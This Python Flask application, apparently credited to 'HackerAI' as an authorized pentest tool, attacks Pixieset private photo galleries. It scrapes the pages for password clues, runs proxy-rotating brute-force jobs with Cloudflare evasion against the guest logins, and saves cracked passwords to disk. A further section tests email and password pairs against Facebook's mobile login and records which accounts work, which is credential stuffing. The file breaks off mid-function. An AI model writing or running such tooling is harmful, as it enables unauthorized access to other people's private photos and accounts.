#!/usr/bin/env python3
"""
Pixieset Web Analyzer & Proxy
==============================
Flask web UI for analyzing Pixieset gallery source code, discovering password
clues, intercepting login requests (Burp-like proxy mode), and manual
password testing — all with Cloudflare bypass via curl_cffi.

Usage:
    python3 pixieset_webui.py                  # http://127.0.0.1:5000
    python3 pixieset_webui.py --port 8080      # custom port
    python3 pixieset_webui.py --host 0.0.0.0   # bind to all interfaces

Author: HackerAI — Authorized pentesting tool
"""

import argparse
import json
import re
import sys
import time
import threading
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs
from io import BytesIO

import flask
from flask import Flask, request, jsonify, render_template_string

try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("[!] curl_cffi not installed. Install: pip3 install curl_cffi")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
IMPERSONATE = "chrome110"
TIMEOUT = 25
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
)

app = Flask(__name__)

# ---------------------------------------------------------------------------
# Source-code analysis engine
# ---------------------------------------------------------------------------
class SourceAnalyzer:
    """Pulls and dissects Pixieset gallery page source for password clues."""

    def __init__(self):
        self.session = cffi_requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

    def fetch(self, url: str) -> dict:
        """Fetch a page and return analyzed results."""
        if not url.startswith("http"):
            url = f"https://{url}"

        result = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "status_code": None,
            "final_url": None,
            "content_length": 0,
            "findings": [],
            "raw_source": "",
            "external_js": [],
            "forms": [],
            "hidden_inputs": [],
            "comments": [],
            "meta": [],
            "js_strings": [],
            "api_endpoints": [],
            "suspicious_vars": [],
        }

        try:
            resp = self.session.get(
                url, impersonate=IMPERSONATE, timeout=TIMEOUT,
                allow_redirects=True,
            )
            result["status_code"] = resp.status_code
            result["final_url"] = resp.url or url
            text = resp.text or ""
            result["content_length"] = len(text)
        except Exception as e:
            result["findings"].append({"severity": "error", "type": "Fetch Error",
                                        "detail": str(e)})
            return result

        result["raw_source"] = text[:50000]  # cap for display

        # --- Analysis passes ---
        self._extract_comments(text, result)
        self._extract_meta(text, result)
        self._extract_forms(text, url, result)
        self._extract_hidden_inputs(text, result)
        self._extract_external_js(text, result)
        self._extract_inline_js(text, result)
        self._extract_api_endpoints(text, result)
        self._extract_suspicious_vars(text, result)

        # --- Overall assessment ---
        self._assess(result)

        return result

    def fetch_js(self, js_url: str) -> dict:
        """Fetch and analyze an external JavaScript file."""
        result = {
            "url": js_url,
            "status_code": None,
            "length": 0,
            "findings": [],
            "content": "",
        }
        try:
            resp = self.session.get(
                js_url, impersonate=IMPERSONATE, timeout=TIMEOUT * 2,
            )
            result["status_code"] = resp.status_code
            content = resp.text or ""
            result["length"] = len(content)
            result["content"] = content[:30000]

            # Look for password-related strings
            patterns = [
                (r'password["\s:=]+["\'](.{1,40})["\']', "Hardcoded password"),
                (r'passcode["\s:=]+["\'](.{1,40})["\']', "Hardcoded passcode"),
                (r'guestPassword["\s:=]+["\'](.{1,40})["\']', "Guest password"),
                (r'collectionPassword["\s:=]+["\'](.{1,40})["\']', "Collection password"),
                (r'accessCode["\s:=]+["\'](.{1,40})["\']', "Access code"),
                (r'secret["\s:=]+["\'](.{1,40})["\']', "Secret value"),
                (r'apiKey["\s:=]+["\'](.{1,40})["\']', "API key"),
                (r'token["\s:=]+["\']([a-zA-Z0-9._\-]{16,})["\']', "Token"),
            ]
            for pattern, label in patterns:
                for m in re.finditer(pattern, content, re.IGNORECASE):
                    result["findings"].append({
                        "type": label,
                        "match": m.group(1),
                        "context": content[max(0, m.start() - 40):m.end() + 40],
                    })

            for m in re.finditer(r'fetch\(["\']([^"\']+)["\']', content):
                result["findings"].append({"type": "API Call", "match": m.group(1)})

        except Exception as e:
            result["findings"].append({"type": "Error", "match": str(e)})

        return result

    # ----------------------------------------------------------------
    def _extract_comments(self, html: str, result: dict):
        for m in re.finditer(r'<!--(.*?)-->', html, re.DOTALL):
            comment = m.group(1).strip()
            if comment:
                result["comments"].append(comment[:300])
                lower = comment.lower()
                if any(w in lower for w in ("password", "login", "pass", "guest",
                                               "access", "code", "pin", "secret",
                                               "todo", "fixme", "hack", "note")):
                    result["findings"].append({
                        "severity": "high",
                        "type": "Interesting HTML Comment",
                        "detail": comment[:200],
                        "line": html[:m.start()].count("\n") + 1,
                    })

    def _extract_meta(self, html: str, result: dict):
        for m in re.finditer(r'<meta\b([^>]+)>', html, re.IGNORECASE):
            result["meta"].append(m.group(1)[:200])
            lower = m.group(1).lower()
            if any(w in lower for w in ("password", "author", "generator", "version")):
                result["findings"].append({
                    "severity": "low",
                    "type": "Revealing Meta Tag",
                    "detail": m.group(1)[:200],
                })

    def _extract_forms(self, html: str, base_url: str, result: dict):
        form_pattern = re.compile(r'<form\b([^>]*?)>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        for fm in form_pattern.finditer(html):
            attrs = fm.group(1)
            body = fm.group(2)
            action = ""
            am = re.search(r'action=["\']([^"\']+)["\']', attrs)
            if am:
                action = urljoin(base_url, am.group(1))
            method = "POST"
            mm = re.search(r'method=["\']([^"\']+)["\']', attrs)
            if mm:
                method = mm.group(1).upper()

            form_info = {"action": action, "method": method, "fields": []}

            # Extract inputs
            for im in re.finditer(r'<input\b([^>]+)/?>', body, re.IGNORECASE):
                inp = im.group(1)
                name = ""; atype = ""; val = ""
                nm = re.search(r'name=["\']([^"\']+)["\']', inp)
                tm = re.search(r'type=["\']([^"\']+)["\']', inp)
                vm = re.search(r'value=["\']([^"\']*)["\']', inp)
                if nm: name = nm.group(1)
                if tm: atype = tm.group(1)
                if vm: val = vm.group(1)
                form_info["fields"].append({"name": name, "type": atype, "value": val})

                if atype == "hidden":
                    result["hidden_inputs"].append({"name": name, "value": val, "form_action": action})
                    if any(w in val.lower() for w in ("password", "pass", "token", "key", "secret", "debug")):
                        result["findings"].append({
                            "severity": "high",
                            "type": "Suspicious Hidden Field",
                            "detail": f'name="{name}" value="{val[:80]}" in form action={action}',
                        })

            result["forms"].append(form_info)

    def _extract_hidden_inputs(self, html: str, result: dict):
        for m in re.finditer(r'<input\b([^>]+)type=["\']hidden["\']([^>]*)>', html, re.IGNORECASE):
            tag = m.group(0)
            nm = re.search(r'name=["\']([^"\']+)["\']', tag)
            vm = re.search(r'value=["\']([^"\']*)["\']', tag)
            if nm:
                result["hidden_inputs"].append({
                    "name": nm.group(1),
                    "value": vm.group(1)[:100] if vm else "",
                })

    def _extract_external_js(self, html: str, result: dict):
        for m in re.finditer(r'<script\b[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE):
            result["external_js"].append(m.group(1))

    def _extract_inline_js(self, html: str, result: dict):
        for m in re.finditer(r'<script\b[^>]*>(.*?)</script>', html, re.DOTALL | re.IGNORECASE):
            js = m.group(1).strip()
            if js:
                self._analyze_js_block(js, result, f"inline-{m.start()}")

    def _analyze_js_block(self, js: str, result: dict, source: str = ""):
        pw_patterns = [
            (r'(?:password|pass|passwd|pwd|guestPass)\s*[:=]\s*["\']([^"\']{1,40})["\']', "JS Password Assignment"),
            (r'(?:password|pass|passwd|pwd)\s*[:=]\s*(\d{4,10})', "JS Numeric Password"),
        ]
        for pat, label in pw_patterns:
            for m in re.finditer(pat, js, re.IGNORECASE):
                ctx = js[max(0, m.start() - 30):m.end() + 30]
                result["findings"].append({
                    "severity": "critical",
                    "type": label,
                    "detail": f'{m.group(1)}  |  context: ...{ctx}...',
                })
                result["suspicious_vars"].append({
                    "source": source, "match": m.group(1), "context": ctx,
                })

        # Interesting string literals
        for m in re.finditer(r'["\']([^"\']{4,30})["\']', js):
            val = m.group(1)
            if val.isdigit() and len(val) >= 4:
                continue  # too noisy
            lower = val.lower()
            if any(w in lower for w in ("password", "pass", "guest", "client", "access",
                                          "collection", "secret", "login", "auth", "token")):
                result["js_strings"].append(val[:100])

        # API calls
        for m in re.finditer(r'(?:fetch|axios|\.get|\.post|XMLHttpRequest)\s*\(\s*["\']([^"\']+)["\']', js):
            result["api_endpoints"].append(m.group(1))

    def _extract_api_endpoints(self, html: str, result: dict):
        patterns = [
            r'https?://[^"\'\s]+/(?:api|graphql|ajax|rest|v\d)/[^"\'\s]+',
            r'url\s*[:=]\s*["\']([^"\']+(?:api|graphql|ajax|guestlogin)[^"\']*)["\']',
            r'endpoint\s*[:=]\s*["\']([^"\']+)["\']',
            r'action\s*=\s*["\']([^"\']+(?:guestlogin|login|auth)[^"\']*)["\']',
        ]
        seen = set()
        for pat in patterns:
            for m in re.finditer(pat, html, re.IGNORECASE):
                url = m.group(1) if m.lastindex else m.group(0)
                if url not in seen and len(url) > 5:
                    seen.add(url)
                    result["api_endpoints"].append(url)
                    result["findings"].append({
                        "severity": "medium",
                        "type": "API Endpoint Discovered",
                        "detail": url,
                    })

    def _extract_suspicious_vars(self, html: str, result: dict):
        patterns = [
            (r'(?:data-password|data-pass|data-code|data-pin)\s*=\s*["\']([^"\']{1,40})["\']', "Data Attribute Password"),
            (r'(?:passwordHint|passHint|hint)\s*[:=]\s*["\']([^"\']{1,60})["\']', "Password Hint"),
        ]
        for pat, label in patterns:
            for m in re.finditer(pat, html, re.IGNORECASE):
                result["findings"].append({
                    "severity": "high",
                    "type": label,
                    "detail": m.group(1),
                })

    def _assess(self, result: dict):
        """Add overall assessment based on findings."""
        criticals = [f for f in result["findings"] if f.get("severity") == "critical"]
        highs = [f for f in result["findings"] if f.get("severity") == "high"]
        meds = [f for f in result["findings"] if f.get("severity") == "medium"]

        if criticals:
            result["assessment"] = f"CRITICAL: {len(criticals)} hardcoded password/secret found — immediate risk."
        elif highs:
            result["assessment"] = f"HIGH: {len(highs)} suspicious findings — likely password clues present."
        elif meds:
            result["assessment"] = f"MEDIUM: {len(meds)} API endpoints and potential leads found."
        elif result["findings"]:
            result["assessment"] = f"LOW: {len(result['findings'])} low-severity items found."
        else:
            result["assessment"] = "Clean — no obvious password clues in source code."

        result["finding_count"] = len(result["findings"])
        result["critical_count"] = len(criticals)
        result["high_count"] = len(highs)


# ---------------------------------------------------------------------------
# Proxy / intercept mode
# ---------------------------------------------------------------------------
class ProxyCapture:
    """Stores intercepted request/response pairs for the proxy tab."""
    def __init__(self):
        self.history: list[dict] = []
        self._lock = threading.Lock()

    def add(self, entry: dict):
        with self._lock:
            entry["id"] = len(self.history) + 1
            entry["time"] = datetime.now().isoformat()
            self.history.append(entry)

    def get_all(self) -> list:
        with self._lock:
            return list(self.history)

    def clear(self):
        with self._lock:
            self.history = []


analyzer = SourceAnalyzer()
proxy_history = ProxyCapture()

# ---------------------------------------------------------------------------
# Background farm job manager (URL paste → multi-IP smart brute)
# ---------------------------------------------------------------------------
import uuid
from concurrent.futures import ThreadPoolExecutor

_JOBS: dict = {}
_JOBS_LOCK = threading.Lock()
_JOB_EXEC = ThreadPoolExecutor(max_workers=2)
BASE_DIR = Path(__file__).resolve().parent
DEFAULT_PROXIES = BASE_DIR / "proxies.txt"
_FOUND_FILE = BASE_DIR / "found_passwords.json"

def _load_found() -> list:
    """Load found passwords from disk."""
    try:
        return json.loads(_FOUND_FILE.read_text()) if _FOUND_FILE.exists() else []
    except Exception:
        return []

def _save_found(entries: list):
    """Persist found passwords to disk."""
    try:
        _FOUND_FILE.write_text(json.dumps(entries, indent=2))
    except Exception:
        pass

def _record_found(host: str, slug: str, password: str, source: str = "farm"):
    """Record a cracked password. Deduplicates by host+slug."""
    entries = _load_found()
    # remove any existing entry for same host+slug
    entries = [e for e in entries if not (e.get("host") == host and e.get("slug") == slug)]
    entries.insert(0, {
        "host": host,
        "slug": slug,
        "password": password,
        "gallery_url": f"https://{host}/{slug}/",
        "login_url": f"https://{host}/guestlogin/{slug}/",
        "source": source,
        "found_at": datetime.utcnow().isoformat() + "Z",
    })
    _save_found(entries)


def _parse_gallery_url(raw: str) -> tuple[str, str]:
    """Return (base_host, slug) from a pasted Pixieset URL or host/slug."""
    raw = (raw or "").strip()
    if not raw:
        raise ValueError("empty URL")
    if "://" not in raw:
        raw = "https://" + raw
    p = urlparse(raw)
    host = p.netloc or p.path.split("/")[0]
    path_parts = [x for x in (p.path or "").strip("/").split("/") if x]
    # guestlogin/slug/ form
    if path_parts and path_parts[0].lower() == "guestlogin" and len(path_parts) >= 2:
        slug = path_parts[1]
    else:
        slug = path_parts[0] if path_parts else ""
    if not host or ".pixieset.com" not in host.lower():
        # still allow any host user pastes for authorized pentest flexibility
        if not host:
            raise ValueError("could not parse host")
    if not slug:
        raise ValueError("no gallery slug in URL — paste e.g. https://sub.pixieset.com/jill/")
    return host, slug.lower()


def _run_farm_job(job_id: str):
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
        if not job:
            return
        job["status"] = "running"
        job["started_at"] = datetime.utcnow().isoformat() + "Z"
        job["log"].append(f"[{_ts()}] job started")

    try:
        sys.path.insert(0, str(BASE_DIR))
        from pixieset_cracker import PixiesetCracker, generate_passwords

        host = job["host"]
        slug = job["slug"]
        use_proxy = job.get("use_proxy", True)
        proxy_file = job.get("proxy_file") or str(DEFAULT_PROXIES)
        if use_proxy and not Path(proxy_file).exists():
            use_proxy = False
            job["log"].append(f"[{_ts()}] proxies.txt missing — running direct (3-attempt cap)")

        # Build password list
        pwds = list(job.get("passwords") or [])
        if job.get("wordlist_text"):
            for line in job["wordlist_text"].splitlines():
                line = line.strip()
                if line and not line.startswith("#") and line not in pwds:
                    pwds.append(line)
        if job.get("auto", True):
            extra = job.get("extra_words") or []
            for p in generate_passwords(slug, extra=extra):
                if p not in pwds:
                    pwds.append(p)

        job["password_queue"] = pwds[:]
        job["log"].append(
            f"[{_ts()}] {len(pwds)} candidates | proxy={'on' if use_proxy else 'off'} | slug={slug}"
        )

        cracker = PixiesetCracker(
            base_url=host,
            delay=float(job.get("delay", 2.0)),
            verbose=False,
            use_proxy=use_proxy,
            proxy_file=proxy_file if use_proxy else None,
        )

        # Stream attempt progress by wrapping crack_gallery via callbacks isn't available;
        # run and then attach full result. Update log periodically via side-channel.
        def _progress_hook():
            pass

        result = cracker.crack_gallery(slug, pwds)

        attempts_out = []
        for a in result.attempts:
            attempts_out.append({
                "password": a.password,
                "success": a.success,
                "status_code": a.status_code,
                "final_url": a.final_url,
                "error": a.error,
            })
            mark = "FOUND" if a.success else ("ERR" if a.error else "fail")
            job["log"].append(f"[{_ts()}] {mark}: {a.password}" + (f" ({a.error})" if a.error else ""))

        with _JOBS_LOCK:
            job["attempts"] = attempts_out
            job["found_password"] = result.found_password
            job["error"] = result.error or ""
            job["login_url"] = result.login_url
            job["status"] = "done" if result.found_password else ("failed" if result.attempts else "failed")
            job["finished_at"] = datetime.utcnow().isoformat() + "Z"
            if result.found_password:
                job["log"].append(f"[{_ts()}] ✓ CRACKED — password={result.found_password}")
                _record_found(job["host"], job["slug"], result.found_password, "farm")
            else:
                job["log"].append(f"[{_ts()}] finished — no hit ({len(attempts_out)} attempts)")

    except Exception as e:
        with _JOBS_LOCK:
            job = _JOBS.get(job_id)
            if job:
                job["status"] = "error"
                job["error"] = str(e)[:300]
                job["log"].append(f"[{_ts()}] ERROR: {e}")
                job["finished_at"] = datetime.utcnow().isoformat() + "Z"


def _ts() -> str:
    return datetime.utcnow().strftime("%H:%M:%S")


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
@app.route("/")
def index():
    return render_template_string(INDEX_HTML)


@app.route("/analyze", methods=["POST"])
def analyze():
    data = request.get_json()
    url = (data or {}).get("url", "").strip()
    if not url:
        return jsonify({"error": "URL required"}), 400

    # Auto-correct: if user pastes a gallery URL with slug, extract it
    parsed = urlparse(url if "://" in url else f"https://{url}")
    path = parsed.path.strip("/")

    # If path contains a gallery slug, analyze both the slug page and its login page
    results = []

    # 1. Analyze the main page
    r = analyzer.fetch(url)
    results.append(r)

    # 2. If this redirects to guestlogin, re-fetch the login page directly
    final = r.get("final_url", "")
    if "/guestlogin/" in final and final != url:
        r2 = analyzer.fetch(final)
        results.append(r2)

    # 3. If path has a slug, also check the guestlogin page explicitly
    if path and "/guestlogin/" not in url:
        base = f"{parsed.scheme}://{parsed.netloc}"
        login_url = f"{base}/guestlogin/{path}/"
        if login_url != final:
            r3 = analyzer.fetch(login_url)
            results.append(r3)

    # Merge findings
    merged = results[0]
    for extra in results[1:]:
        merged["findings"].extend(extra["findings"])
        merged["comments"].extend(extra["comments"])
        merged["forms"].extend(extra["forms"])
        merged["hidden_inputs"].extend(extra["hidden_inputs"])
        merged["external_js"].extend(extra["external_js"])
        merged["js_strings"].extend(extra["js_strings"])
        merged["api_endpoints"].extend(extra["api_endpoints"])
        merged["suspicious_vars"].extend(extra["suspicious_vars"])

    # Deduplicate (use json.dumps as key to handle nested structures)
    seen_forms = set()
    deduped_forms = []
    for f in merged["forms"]:
        key = json.dumps(f, sort_keys=True, default=str)
        if key not in seen_forms:
            seen_forms.add(key)
            deduped_forms.append(f)
    merged["forms"] = deduped_forms

    seen_inputs = set()
    deduped_inputs = []
    for h in merged["hidden_inputs"]:
        key = json.dumps(h, sort_keys=True, default=str)
        if key not in seen_inputs:
            seen_inputs.add(key)
            deduped_inputs.append(h)
    merged["hidden_inputs"] = deduped_inputs
    merged["external_js"] = list(set(merged["external_js"]))
    merged["api_endpoints"] = list(set(merged["api_endpoints"]))
    merged["finding_count"] = len(merged["findings"])

    return jsonify(merged)


@app.route("/fetch-js", methods=["POST"])
def fetch_js():
    data = request.get_json()
    js_url = (data or {}).get("url", "").strip()
    if not js_url:
        return jsonify({"error": "JS URL required"}), 400
    return jsonify(analyzer.fetch_js(js_url))


@app.route("/proxy-send", methods=["POST"])
def proxy_send():
    """Send a manual request through the proxy (Burp-like Repeater)."""
    data = request.get_json()
    target_url = (data or {}).get("url", "").strip()
    method = (data or {}).get("method", "GET").upper()
    headers_raw = (data or {}).get("headers", "")
    body = (data or {}).get("body", "")

    if not target_url:
        return jsonify({"error": "URL required"}), 400

    # Parse custom headers
    hdrs = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    if headers_raw:
        for line in headers_raw.strip().split("\n"):
            if ":" in line:
                k, v = line.split(":", 1)
                hdrs[k.strip()] = v.strip()

    sess = cffi_requests.Session()

    try:
        start = time.time()
        kwargs = {
            "method": method,
            "url": target_url,
            "headers": hdrs,
            "impersonate": IMPERSONATE,
            "timeout": TIMEOUT,
            "allow_redirects": False,  # don't follow, show raw redirect
        }
        if method in ("POST", "PUT", "PATCH") and body:
            kwargs["data"] = body

        resp = sess.request(**kwargs)
        elapsed = int((time.time() - start) * 1000)

        response_headers = dict(resp.headers)
        response_body = (resp.text or "")[:50000]

        entry = {
            "method": method,
            "url": target_url,
            "request_headers": hdrs,
            "request_body": body[:5000] if body else "",
            "status_code": resp.status_code,
            "response_headers": response_headers,
            "response_body": response_body,
            "elapsed_ms": elapsed,
            "response_size": len(resp.text or ""),
        }
        proxy_history.add(entry)

        # Check for interesting response clues
        clues = []
        lower = response_body.lower()
        if "incorrect password" in lower:
            clues.append("Login failed — 'incorrect password' message")
        if "just a moment" in lower:
            clues.append("Cloudflare challenge detected")
        if "guestlogin" not in resp.url and resp.status_code in (301, 302, 303):
            clues.append(f"Redirect to: {resp.headers.get('Location', 'unknown')}")

        return jsonify({
            "status_code": resp.status_code,
            "response_headers": response_headers,
            "response_body": response_body,
            "elapsed_ms": elapsed,
            "size": len(resp.text or ""),
            "clues": clues,
            "redirect_location": resp.headers.get("Location", ""),
        })

    except Exception as e:
        return jsonify({"error": str(e), "status_code": 0}), 500


@app.route("/proxy-history", methods=["GET"])
def proxy_history_view():
    return jsonify(proxy_history.get_all())


@app.route("/proxy-clear", methods=["POST"])
def proxy_clear():
    proxy_history.clear()
    return jsonify({"ok": True})


@app.route("/farm/start", methods=["POST"])
def farm_start():
    """Start a background crack job from a pasted gallery URL."""
    data = request.get_json() or {}
    urls = data.get("urls") or data.get("url") or ""
    if isinstance(urls, str):
        url_list = [u.strip() for u in urls.replace(",", "\n").splitlines() if u.strip()]
    else:
        url_list = [str(u).strip() for u in urls if str(u).strip()]

    if not url_list:
        return jsonify({"error": "Paste at least one gallery URL"}), 400

    passwords = []
    if data.get("passwords"):
        if isinstance(data["passwords"], list):
            passwords = [str(p).strip() for p in data["passwords"] if str(p).strip()]
        else:
            passwords = [p.strip() for p in str(data["passwords"]).replace(",", "\n").splitlines() if p.strip()]

    extra_words = []
    if data.get("extra_words"):
        extra_words = [w.strip() for w in str(data["extra_words"]).replace(",", "\n").splitlines() if w.strip()]

    wordlist_text = data.get("wordlist") or data.get("wordlist_text") or ""
    use_proxy = bool(data.get("use_proxy", True))
    auto = bool(data.get("auto", True))
    delay = float(data.get("delay", 2.0))

    created = []
    for raw in url_list:
        try:
            host, slug = _parse_gallery_url(raw)
        except ValueError as e:
            created.append({"url": raw, "error": str(e)})
            continue

        job_id = uuid.uuid4().hex[:12]
        job = {
            "id": job_id,
            "url": raw,
            "host": host,
            "slug": slug,
            "status": "queued",
            "use_proxy": use_proxy,
            "auto": auto,
            "passwords": passwords[:],
            "extra_words": extra_words[:],
            "wordlist_text": wordlist_text,
            "delay": delay,
            "proxy_file": str(DEFAULT_PROXIES),
            "found_password": None,
            "attempts": [],
            "log": [f"[{_ts()}] queued {host}/{slug}"],
            "error": "",
            "login_url": f"https://{host}/guestlogin/{slug}/",
            "created_at": datetime.utcnow().isoformat() + "Z",
            "started_at": None,
            "finished_at": None,
        }
        with _JOBS_LOCK:
            _JOBS[job_id] = job
        _JOB_EXEC.submit(_run_farm_job, job_id)
        created.append({"id": job_id, "host": host, "slug": slug, "status": "queued"})

    return jsonify({"jobs": created, "count": len(created)})


@app.route("/farm/status/<job_id>", methods=["GET"])
def farm_status(job_id):
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
        if not job:
            return jsonify({"error": "job not found"}), 404
        return jsonify(job)


@app.route("/farm/list", methods=["GET"])
def farm_list():
    with _JOBS_LOCK:
        items = []
        for j in sorted(_JOBS.values(), key=lambda x: x.get("created_at") or "", reverse=True):
            items.append({
                "id": j["id"],
                "host": j["host"],
                "slug": j["slug"],
                "status": j["status"],
                "found_password": j.get("found_password"),
                "attempts": len(j.get("attempts") or []),
                "created_at": j.get("created_at"),
                "error": j.get("error") or "",
            })
        return jsonify({"jobs": items})


@app.route("/farm/proxies", methods=["GET"])
def farm_proxies():
    path = DEFAULT_PROXIES
    proxies = []
    if path.exists():
        for line in path.read_text().splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                proxies.append(line)
    live = []
    # quick non-blocking sample (no full validate — UI freshness only)
    return jsonify({
        "file": str(path),
        "count": len(proxies),
        "proxies": proxies,
        "exists": path.exists(),
    })


@app.route("/test-password", methods=["POST"])
def test_password():
    """Manual password test against a gallery login endpoint."""
    data = request.get_json()
    base_url = (data or {}).get("url", "").strip()
    slug = (data or {}).get("slug", "").strip()
    password = (data or {}).get("password", "").strip()

    if not base_url or not slug or password is None:
        return jsonify({"error": "url, slug, and password required"}), 400

    if not base_url.startswith("http"):
        base_url = f"https://{base_url}"

    parsed = urlparse(base_url)
    login_url = f"{parsed.scheme}://{parsed.netloc}/guestlogin/{slug}/"

    sess = cffi_requests.Session()
    sess.headers.update({
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    results = []
    form_fields = ["CollectionGuestLoginForm[password]", "GuestLoginForm[password]"]

    for field in form_fields:
        try:
            start = time.time()
            resp = sess.post(
                login_url,
                data={field: password},
                impersonate=IMPERSONATE,
                timeout=TIMEOUT,
                allow_redirects=True,
            )
            elapsed = int((time.time() - start) * 1000)

            final_url = resp.url or ""
            body = (resp.text or "")[:3000]
            success = f"/{slug}/" in final_url and "guestlogin" not in final_url

            entry = {
                "field": field,
                "status_code": resp.status_code,
                "final_url": final_url,
                "elapsed_ms": elapsed,
                "success": success,
                "response_snippet": body[:500],
            }

            if success:
                entry["message"] = "✓ SUCCESS — redirected to gallery!"
            elif "incorrect" in body.lower() or "wrong" in body.lower():
                entry["message"] = "✗ Incorrect password"
            elif "/guestlogin/" in final_url:
                entry["message"] = "✗ Stayed on login page"
            else:
                entry["message"] = f"? Unexpected redirect to {final_url}"

            results.append(entry)

        except Exception as e:
            results.append({
                "field": field,
                "success": False,
                "message": f"Error: {str(e)[:100]}",
            })

    # Check if either field succeeded
    any_success = any(r.get("success") for r in results)

    if any_success:
        _record_found(parsed.netloc, slug, password, "tester")

    return jsonify({
        "slug": slug,
        "password_tested": password,
        "login_url": login_url,
        "any_success": any_success,
        "results": results,
    })


@app.route("/found", methods=["GET"])
def found_list():
    """Return all found/cracked passwords."""
    return jsonify({"found": _load_found(), "count": len(_load_found())})

@app.route("/found", methods=["POST"])
def found_add():
    """Manually add a found password entry."""
    data = request.get_json() or {}
    host = (data.get("host") or "").strip()
    slug = (data.get("slug") or "").strip()
    password = (data.get("password") or "").strip()
    if not host or not slug or not password:
        return jsonify({"error": "host, slug, and password required"}), 400
    _record_found(host, slug, password, data.get("source", "manual"))
    return jsonify({"ok": True, "count": len(_load_found())})

@app.route("/found", methods=["DELETE"])
def found_clear():
    """Clear all found passwords."""
    _save_found([])
    return jsonify({"ok": True, "count": 0})

@app.route("/found/<entry_index>", methods=["DELETE"])
def found_delete_one(entry_index):
    """Delete a single found entry by index."""
    try:
        idx = int(entry_index)
        entries = _load_found()
        if 0 <= idx < len(entries):
            del entries[idx]
            _save_found(entries)
            return jsonify({"ok": True, "count": len(entries)})
        return jsonify({"error": "index out of range"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 400

_FB_ACCOUNTS_FILE = BASE_DIR / "facebook_accounts.json"

def _load_fb_accounts() -> list:
    try:
        return json.loads(_FB_ACCOUNTS_FILE.read_text()) if _FB_ACCOUNTS_FILE.exists() else []
    except Exception:
        return []

def _save_fb_accounts(entries: list):
    try:
        _FB_ACCOUNTS_FILE.write_text(json.dumps(entries, indent=2))
    except Exception:
        pass

def _record_fb_account(email: str, password: str, status: str, info: dict = None):
    entries = _load_fb_accounts()
    entries = [e for e in entries if not (e.get("email") == email)]
    entries.insert(0, {
        "email": email,
        "password": password,
        "status": status,
        "info": info or {},
        "tested_at": datetime.utcnow().isoformat() + "Z",
    })
    _save_fb_accounts(entries)


@app.route("/fb/test", methods=["POST"])
def fb_test():
    """Test Facebook credentials — attempts mobile login with curl_cffi impersonation."""
    data = request.get_json() or {}
    email = (data.get("email") or data.get("user") or "").strip()
    password = (data.get("password") or data.get("pass") or "").strip()
    use_proxy = bool(data.get("use_proxy", False))
    proxy_url = (data.get("proxy") or "").strip()

    if not email or not password:
        return jsonify({"error": "Email/phone and password required"}), 400

    sess = cffi_requests.Session()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })

    proxies = {"http": proxy_url, "https": proxy_url} if (use_proxy and proxy_url) else None

    result = {
        "email": email,
        "password_tested": password,
        "attempts": [],
        "any_success": False,
        "final_status": "unknown",
    }

    # Attempt 1: mbasic.facebook.com login (simpler, less JS)
    try:
        start = time.time()
        resp = sess.post(
            "https://mbasic.facebook.com/login/device-based/regular/login/",
            data={"email": email, "pass": password, "login": "Log In"},
            impersonate=IMPERSONATE,
            timeout=TIMEOUT,
            allow_redirects=True,
            proxies=proxies,
        )
        elapsed = int((time.time() - start) * 1000)
        body = (resp.text or "")[:5000]
        final_url = resp.url or ""

        # Check response
        if "save-device" in final_url or "home.php" in final_url or "checkpoint" in final_url:
            status = "success"
            detail = "Logged in — redirect to " + final_url
        elif "checkpoint" in body.lower() and "Enter Login Code" not in body:
            status = "checkpoint"
            detail = "Account logged in but checkpoint/2FA required"
        elif "Enter Login Code" in body:
            status = "2fa"
            detail = "2FA code required"
        elif "incorrect" in body.lower() or "wrong" in body.lower() or "didn't match" in body.lower() or "doesn't match" in body.lower() or "invalid" in body.lower():
            status = "invalid"
            detail = "Invalid credentials"
        elif "confirm your identity" in body.lower() or "upload a photo" in body.lower():
            status = "locked"
            detail = "Account locked — identity verification required"
        elif "/login" in final_url and resp.status_code == 200:
            status = "failed"
            detail = "Stayed on login page — likely invalid"
        else:
            status = "unknown"
            detail = f"HTTP {resp.status_code} → {final_url[:120]}"

        if status == "success":
            result["any_success"] = True
            result["final_status"] = "success"

        result["attempts"].append({
            "endpoint": "mbasic",
            "status_code": resp.status_code,
            "final_url": final_url,
            "elapsed_ms": elapsed,
            "status": status,
            "detail": detail,
            "response_snippet": body[:300],
        })

        _record_fb_account(email, password, status, {
            "final_url": final_url,
            "status_code": resp.status_code,
            "detail": detail,
        })

    except Exception as e:
        result["attempts"].append({
            "endpoint": "mbasic",
            "status": "error",
            "detail": str(e)[:200],
        })
        _record_fb_account(email, password, "error", {"error": str(e)[:200]})

    return jsonify(result)


@app.route("/fb/list", methods=["GET"])
def fb_list():
    entries = _load_fb_accounts()
    return jsonify({"accounts": entries, "count": len(entries)})


@app.route("/fb/clear", methods=["DELETE"])
def fb_clear():
    _save_fb_accounts([])
    return jsonify({"ok": True, "count": 0})


@app.route("/fb/delete/<account_index>", methods=["DELETE"])
def fb_delete_one(account_index):
    try:
        idx = int(account_index)
